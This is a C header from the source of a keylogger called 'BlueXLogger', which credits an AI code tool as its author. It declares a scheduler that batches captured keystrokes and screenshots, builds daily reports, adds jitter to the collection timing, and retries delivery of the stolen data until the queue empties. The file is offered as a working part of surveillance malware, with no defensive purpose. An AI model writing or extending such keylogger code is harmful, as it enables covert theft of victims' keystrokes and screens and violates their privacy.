/*============================================================================
 * BlueXLogger - bxl_schedule.h
 * Batch collection and delivery scheduling.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Design contract
 * ---------------
 * The scheduler never fires per keystroke and never fires per screenshot.
 * It answers one question per tick: "what should the worker do right now?"
 *
 *   BXL_ACT_LOG    - seal the accumulated keystroke text into one batch
 *   BXL_ACT_SHOT   - capture the due screenshots into one batch
 *   BXL_ACT_DAILY  - consolidated end-of-day report (implies LOG|SHOT)
 *   BXL_ACT_FLUSH  - attempt delivery of everything currently queued
 *
 * Collection and delivery are deliberately decoupled: a batch is only ever
 * *collected* on a schedule, but delivery is retried independently until the
 * queue drains. That is what makes transient network failures lossless.
 *
 * The module is pure with respect to the clock - the caller supplies both a
 * monotonic millisecond counter and wall-clock unix seconds, which makes the
 * whole thing deterministic and unit-testable.
 *==========================================================================*/
#ifndef BXL_SCHEDULE_H
#define BXL_SCHEDULE_H

#include "bxl_common.h"
#include "bxl_config.h"

#define BXL_ACT_NONE   0x00u
#define BXL_ACT_LOG    0x01u
#define BXL_ACT_SHOT   0x02u
#define BXL_ACT_DAILY  0x04u
#define BXL_ACT_FLUSH  0x08u

/* First retry delay after a failed delivery, in milliseconds. */
#define BXL_RETRY_BASE_MS   30000u
#define BXL_RETRY_MAX_MS   900000u

typedef struct BxlSched {
    bxl_u64 start_ms;

    bxl_u64 next_log_ms;
    bxl_u64 next_shot_ms;
    bxl_u64 next_daily_unix;
    bxl_u64 next_flush_ms;

    bxl_u32 keystrokes;
    bxl_u32 rng;

    /* Queue depth - what is waiting to go out. */
    bxl_u32 pending_logs;
    bxl_u32 pending_shots;

    /* Bookkeeping / diagnostics. */
    bxl_u32 batches_collected;
    bxl_u32 batches_delivered;
    bxl_u32 daily_reports;
    bxl_u32 retry_streak;
    bxl_u64 last_log_ms;
    bxl_u64 last_shot_ms;
    bxl_i32 last_daily_yday;
} BxlSched;

/* Arm the schedule. `seed` makes jitter reproducible for tests. */
void bxl_sched_init(BxlSched *s, const BxlConfig *cfg,
                    bxl_u64 now_ms, bxl_u64 now_unix, bxl_u32 seed);

/* Count captured keystrokes toward the threshold trigger. */
void bxl_sched_note_keystrokes(BxlSched *s, bxl_u32 count);

/* Queue accounting, driven by the delivery layer. */
void bxl_sched_note_log_queued(BxlSched *s);
void bxl_sched_note_shot_queued(BxlSched *s);
void bxl_sched_note_delivered(BxlSched *s, bxl_u32 logs, bxl_u32 shots);
void bxl_sched_note_delivery_failed(BxlSched *s, bxl_u64 now_ms);

/* Returns a BXL_ACT_* bitmask and advances internal timers accordingly. */
bxl_u32 bxl_sched_tick(BxlSched *s, const BxlConfig *cfg,
                       bxl_u64 now_ms, bxl_u64 now_unix);

/* Compute the next interval, with jitter applied when configured. */
bxl_u64 bxl_sched_interval_ms(const BxlConfig *cfg, bxl_u32 minutes,
                              bxl_u32 *rng);

/* Milliseconds until the next scheduled collection (for a wait timeout). */
bxl_u64 bxl_sched_ms_until_next(const BxlSched *s, bxl_u64 now_ms,
                                bxl_u64 now_unix);

#endif /* BXL_SCHEDULE_H */
